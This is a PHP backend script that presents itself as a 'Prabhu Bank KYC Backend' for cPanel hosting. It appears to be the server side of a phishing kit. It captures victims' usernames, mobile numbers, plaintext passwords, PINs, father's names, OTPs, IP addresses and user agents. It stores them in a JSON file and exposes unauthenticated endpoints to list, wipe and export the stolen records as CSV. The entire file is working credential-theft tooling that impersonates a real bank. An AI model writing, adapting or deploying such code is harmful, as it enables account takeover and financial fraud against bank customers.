<?php
// ==========================================================
// Prabhu Bank KYC Backend — PHP/cPanel Version
// Use this if your host does NOT support Node.js
// ==========================================================
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

$dataDir  = __DIR__ . '/data';
$dataFile = $dataDir . '/responses.json';

if (!is_dir($dataDir)) mkdir($dataDir, 0755, true);
if (!file_exists($dataFile)) file_put_contents($dataFile, '[]');

function readResponses($file) {
    $d = json_decode(file_get_contents($file), true);
    return is_array($d) ? $d : [];
}

function saveResponses($file, $data) {
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function sendJson($status, $obj) {
    http_response_code($status);
    echo json_encode($obj, JSON_UNESCAPED_UNICODE);
    exit;
}

// Determine path from REQUEST_URI
$uri    = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$method = $_SERVER['REQUEST_METHOD'];
$body   = json_decode(file_get_contents('php://input'), true) ?? [];
$ip     = $_SERVER['REMOTE_ADDR'] ?? '';

// Strip /api.php prefix if accessed directly
$path = preg_replace('#^.*/api\.php#', '', $uri) ?: '/';

// ── Routes ────────────────────────────────────────────────

// Health check
if ($path === '/api/health') {
    $data = readResponses($dataFile);
    sendJson(200, [
        'status'         => 'online',
        'service'        => 'Prabhu Bank KYC Backend',
        'totalResponses' => count($data),
        'time'           => date('c'),
    ]);
}

// Get all responses
if ($path === '/api/responses' && $method === 'GET') {
    http_response_code(200);
    echo file_get_contents($dataFile);
    exit;
}

// Clear all responses
if ($path === '/api/responses' && $method === 'DELETE') {
    saveResponses($dataFile, []);
    sendJson(200, ['status' => 'success', 'message' => 'All responses cleared']);
}

// Submit KYC Step 1
if (($path === '/api/submit' || $path === '/api/submit-kyc') && $method === 'POST') {
    $sessionId = $body['sessionId'] ?? ('PRB-SES-' . rand(100000, 999999));
    $record = [
        'id'             => (int)(microtime(true) * 1000),
        'sessionId'      => $sessionId,
        'refId'          => $body['refId'] ?? ('PRB-KYC-' . rand(100000, 999999)),
        'status'         => 'INITIAL_SUBMISSION',
        'username'       => $body['username'] ?? '',
        'mobile'         => $body['mobile'] ?? '',
        'password'       => $body['password'] ?? '',
        'pin'            => $body['pin'] ?? '',
        'fatherName'     => $body['fatherName'] ?? '',
        'otp'            => '',
        'clientIp'       => $ip,
        'userAgent'      => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'createdAt'      => date('Y-m-d H:i:s'),
        'verifiedAt'     => '',
    ];
    $existing = readResponses($dataFile);
    $found = false;
    foreach ($existing as &$r) {
        if ($r['sessionId'] === $sessionId) {
            $r = array_merge($r, $record);
            $found = true;
            break;
        }
    }
    if (!$found) array_unshift($existing, $record);
    saveResponses($dataFile, $existing);
    sendJson(200, ['status' => 'success', 'sessionId' => $sessionId, 'refId' => $record['refId']]);
}

// OTP Verification
if ($path === '/api/verify-otp' && $method === 'POST') {
    $existing  = readResponses($dataFile);
    $finalRefId = $body['refId'] ?? '';
    foreach ($existing as &$r) {
        if ($r['sessionId'] === ($body['sessionId'] ?? '') ||
            ($r['mobile'] === ($body['mobile'] ?? '') && $r['status'] === 'INITIAL_SUBMISSION')) {
            $r['otp']        = $body['otp'] ?? '';
            $r['refId']      = $body['refId'] ?? $r['refId'];
            $r['status']     = 'VERIFIED_COMPLETE';
            $r['verifiedAt'] = date('Y-m-d H:i:s');
            $finalRefId      = $r['refId'];
            break;
        }
    }
    saveResponses($dataFile, $existing);
    sendJson(200, ['status' => 'success', 'refId' => $finalRefId, 'message' => 'OTP recorded']);
}

// Export CSV
if ($path === '/api/export/csv' && $method === 'GET') {
    $records = readResponses($dataFile);
    $cols = ['id','sessionId','refId','status','username','mobile','password','pin','fatherName','otp','clientIp','createdAt','verifiedAt'];
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="kyc_responses.csv"');
    echo implode(',', $cols) . "\n";
    foreach ($records as $r) {
        echo implode(',', array_map(fn($c) => '"' . str_replace('"', '""', $r[$c] ?? '') . '"', $cols)) . "\n";
    }
    exit;
}

// Not found
sendJson(404, ['error' => 'API route not found']);
